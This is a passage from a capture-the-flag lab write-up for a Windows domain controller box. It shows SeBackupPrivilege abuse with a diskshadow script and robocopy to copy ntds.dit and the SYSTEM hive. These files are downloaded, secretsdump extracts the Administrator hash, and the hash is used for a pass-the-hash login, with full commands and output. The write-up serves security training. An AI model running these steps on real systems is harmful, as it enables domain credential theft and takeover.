Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented o
n this machine                                                                                                           
                                                                                                                         
Data: For more information, check Evil-WinRM Github: https://github.com/Hackplayers/evil-winrm#Remote-path-completion    
                                                                                                                         
Info: Establishing connection to remote endpoint                                                                         
                                                                                                                         
*Evil-WinRM* PS C:\Users\xyan1d3\Documents> whoami /priv
whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                    State
============================= ============================== =======
SeMachineAccountPrivilege     Add workstations to domain     Enabled
SeBackupPrivilege             Back up files and directories  Enabled
SeRestorePrivilege            Restore files and directories  Enabled
SeShutdownPrivilege           Shut down the system           Enabled
SeChangeNotifyPrivilege       Bypass traverse checking       Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set Enabled
```

The most interesting privileges are `SeBackupPrivilege` and `SeRestorePrivilege`.

We can follow the 1st method from this great article: <a href="https://medium.com/r3d-buck3t/windows-privesc-with-sebackupprivilege-65d2cd1eb960" target="_blank">Windows PrivEsc with SeBackupPrivilege</a> (`disk shadow`, `robocopy`).

First create a file `back_script.txt` with contents:


```text
set verbose onX
set metadata C:\Windows\Temp\meta.cabX
set context clientaccessibleX
set context persistentX
begin backupX
add volume C: alias cdriveX
createX
expose %cdrive% E:X
end backupX
```

Then, in the `evil-winrm` session upload the file `back_script.txt`.
- Command: `upload back_script.txt`


```shell
Evil-WinRM* PS C:\Users\xyan1d3\Documents> upload back_script.txt
Info: Uploading back_script.txt to C:\Users\xyan1d3\Documents\back_script.txt                                            
                                                                                                                         
                                                                                                                         
Data: 252 bytes of 252 bytes copied                                                                                      
                                                                                                                         
Info: Upload successful!                                                                                                 
                                                                                                                         
*Evil-WinRM* PS C:\Users\xyan1d3\Documents> dir                                                                          


    Directory: C:\Users\xyan1d3\Documents


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-a----       11/15/2022  12:21 PM            191 back_script.txt
```


Then, pass the script to diskshadow utility to create the shadow copy.
- Command: `diskshadow /s back_script.txt`


```shell
*Evil-WinRM* PS C:\Users\xyan1d3\Documents> diskshadow /s back_script.txt
Microsoft DiskShadow version 1.0
Copyright (C) 2013 Microsoft Corporation
On computer:  HAVEN-DC,  11/15/2022 12:21:27 PM

-> set verbose on
-> set metadata C:\Windows\Temp\meta.cab
-> set context clientaccessible
-> set context persistent
-> begin backup
-> add volume C: alias cdrive
-> create
Excluding writer "Shadow Copy Optimization Writer", because all of its components have been excluded.
Component "\BCD\BCD" from writer "ASR Writer" is excluded from backup,
because it requires volume  which is not in the shadow copy set.
The writer "ASR Writer" is now entirely excluded from the backup because the top-level
non selectable component "\BCD\BCD" is excluded.

* Including writer "Task Scheduler Writer":
        + Adding component: \TasksStore

* Including writer "VSS Metadata Store Writer":
        + Adding component: \WriterMetadataStore
<snip>
Number of shadow copies listed: 1
-> expose %cdrive% E:
-> %cdrive% = {8751d494-c204-48ad-b15d-d9269228cb83}
The shadow copy was successfully exposed as E:\.
-> end backup
->
*Evil-WinRM* PS C:\Users\xyan1d3\Documents>
```

Then verify the contents of the `E` drive.


```shell
*Evil-WinRM* PS C:\Users\xyan1d3\Documents> cd ../../..
*Evil-WinRM* PS C:\> mkdir temp
*Evil-WinRM* PS C:\> cd temp
*Evil-WinRM* PS C:\temp> dir E:


    Directory: E:\


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
d-----        5/21/2021   9:39 AM                PerfLogs
d-r---        5/21/2021  11:41 AM                Program Files
d-----        2/23/2021   6:21 AM                Program Files (x86)
d-r---        2/25/2021  10:18 AM                Users
d-----        5/21/2021  11:46 AM                Windows


*Evil-WinRM* PS C:\temp>
```


After that, copy the `NTDS` file using `Robocopy` to the temp folder we created in the C: drive.
- Command: `robocopy /b E:\Windows\ntds . ntds.dit`


```shell
*Evil-WinRM* PS C:\temp> robocopy /b E:\Windows\ntds . ntds.dit                                                          
                                                                                                                         
-------------------------------------------------------------------------------                                          
   ROBOCOPY     ::     Robust File Copy for Windows                                                                      
-------------------------------------------------------------------------------                                          
                                                                                                                         
  Started : Tuesday, November 15, 2022 12:25:47 PM                                                                       
   Source : E:\Windows\ntds\                                                                                             
     Dest : C:\temp\                                                                                                     
                                                                                                                         
    Files : ntds.dit                                                                                                     
                                                                                                                         
  Options : /DCOPY:DA /COPY:DAT /B /R:1000000 /W:30                                                                      
                                                                                                                         
------------------------------------------------------------------------------                                           
                                                                                                                         
                           1    E:\Windows\ntds\                                                                         
            New File              16.0 m        ntds.dit
  0.0%
  0.3%
<snip>
```


Next we get the system registry hive that contains the key needed to decrypt the NTDS file with reg save command and verify that we have both `ntds.dit` and `system.bak`.
- Command: `reg save hklm\system C:\temp\system.bak`


```shell
*Evil-WinRM* PS C:\temp> reg save hklm\system C:\temp\system.bak                                                         
The operation completed successfully.                                                                                    
                                                                                                                         
*Evil-WinRM* PS C:\temp> dir                                                                                             
                                                                                                                         
                                                                                                                         
    Directory: C:\temp                                                                                                   
                                                                                                                         
                                                                                                                         
Mode                LastWriteTime         Length Name                                                                    
----                -------------         ------ ----                                                                    
-a----       11/15/2022  12:22 PM       16777216 ntds.dit                                                                
-a----       11/15/2022  12:26 PM       17219584 system.bak                                                              
                                                                                                                         
                                                                                                                         
*Evil-WinRM* PS C:\temp>
```

Now, we can download these files.
- Command: `download C:\temp\ntds.dit /home/geobour98/ntds.dit`
- Command: `download C:\temp\system.bak /home/geobour98/system.bak`


```shell
*Evil-WinRM* PS C:\temp> download C:\temp\ntds.dit /home/geobour98/ntds.dit
Info: Downloading C:\temp\ntds.dit to /home/geobour98/ntds.dit

                                                             
Info: Download successful!

*Evil-WinRM* PS C:\temp> download C:\temp\system.bak /home/geobour98/system.bak

                                                             
Info: Download successful!

```


Now we can extract the `Administrator's` hash using `secretsdump.py` and use it to login with `evil-winrm`.
- Command: `sudo /opt/impacket/examples/secretsdump.py -system system.bak -ntds ntds.dit LOCAL > hashes1.txt`


```shell
geobour98@kali:~$ sudo /opt/impacket/examples/secretsdump.py -system system.bak -ntds ntds.dit LOCAL > hashes1.txt
geobour98@kali:~$ cat hashes1.txt
<snip>
Administrator:500:aad3b435b51404eeaad3b435b51404ee:9689931bed40ca5a2ce1218210177f0c:::
<snip>
geobour98@kali:~$ evil-winrm -i 10.10.43.148 -u Administrator -H 9689931bed40ca5a2ce1218210177f0c                                               
                                                                                                                                  
Evil-WinRM shell v3.4                                                                                                             
                                                                                                                                  
Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this ma
chine                                                                                                                             
                                                                                                                                  
Data: For more information, check Evil-WinRM Github: https://github.com/Hackplayers/evil-winrm#Remote-path-completion             
                                                                                                                                  
Info: Establishing connection to remote endpoint                                                                                  
                                                                                                                                  
*Evil-WinRM* PS C:\Users\Administrator\Documents> whoami
raz0rblack\administrator

```

Now we can read the file `root.xml` in `C:\Users\Administrator` that contains a `hex` encoded string, which if decoded reveals the `root flag`.


```shell
*Evil-WinRM* PS C:\Users\Administrator> type root.xml            
<Objs Version="1.1.0.1" xmlns="http://schemas.microsoft.com/powershell/2004/04">                                                  
  <Obj RefId="0">               
    <TN RefId="0">              
      <T>System.Management.Automation.PSCredential</T>           
      <T>System.Object</T>      
    </TN>                       
    <ToString>System.Management.Automation.PSCredential</ToString>                                                                
    <Props>                     
      <S N="UserName">Administrator</S>                          
      <SS N="Password">44616d6e20796f752061726520612067656e6975732e0a4275742c20492061706f6c6f67697a6520666f72206368656174696e6720796f75206c696b6520746869732e0a0a4865726520697320796f757220526f6f7420466c61670a54484d7b316234663436636334666261343633343832373364313
86463393164613230647d0a0a546167206d65206f6e2068747470733a2f2f747769747465722e636f6d2f5879616e3164332061626f75742077686174207061727
420796f7520656e6a6f796564206f6e207468697320626f7820616e642077686174207061727420796f75207374727567676c656420776974682e0a0a496620796
f7520656e6a6f796564207468697320626f7820796f75206d617920616c736f2074616b652061206c6f6f6b20617420746865206c696e75786167656e637920726
f6f6d20696e207472796861636b6d652e0a576869636820636f6e7461696e7320736f6d65206c696e75782066756e64616d656e74616c7320616e6420707269766
96c65676520657363616c6174696f6e2068747470733a2f2f7472796861636b6d652e636f6d2f726f6f6d2f6c696e75786167656e63792e0a</SS>
  </Obj>                        
</Objs>                         
*Evil-WinRM* PS C:\Users\Administrator>
```

```shell
geobour98@kali:~$ echo 44616d6e20796f752061726520612067656e6975732e0a4275742c20492061706f6c6f67697a6520666f72206368656174696e6720796f75206c696b6520746869732e0a0a4865726520697320796f757220526f6f7420466c61670a54484d7b31623466343663633466626134363334383237336431386463393164613230647d0a0a546167206d65206f6e2068747470733a2f2f747769747465722e636f6d2f5879616e3164332061626f75742077686174207061727420796f7520656e6a6f796564206f6e207468697320626f7820616e642077686174207061727420796f75207374727567676c656420776974682e0a0a496620796f7520656e6a6f796564207468697320626f7820796f75206d617920616c736f2074616b652061206c6f6f6b20617420746865206c696e75786167656e637920726f6f6d20696e207472796861636b6d652e0a576869636820636f6e7461696e7320736f6d65206c696e75782066756e64616d656e74616c7320616e642070726976696c65676520657363616c6174696f6e2068747470733a2f2f7472796861636b6d652e636f6d2f726f6f6d2f6c696e75786167656e63792e0a | xxd -r -p                   
Damn you are a genius.                                           
But, I apologize for cheating you like this.                                                                                      

Here is your Root Flag                                           
[REDACTED]                            

Tag me on https://twitter.com/Xyan1d3 about what part you enjoyed on this box and what part you struggled with.

If you enjoyed this box you may also take a look at the linuxagency room in tryhackme.
Which contains some linux fundamentals and privilege escalation https://tryhackme.com/room/linuxagency.
```

Proof of Concept (PoC image):
![Desktop View](/assets/img/razorblack/poc.png){: width="972" height="589" }
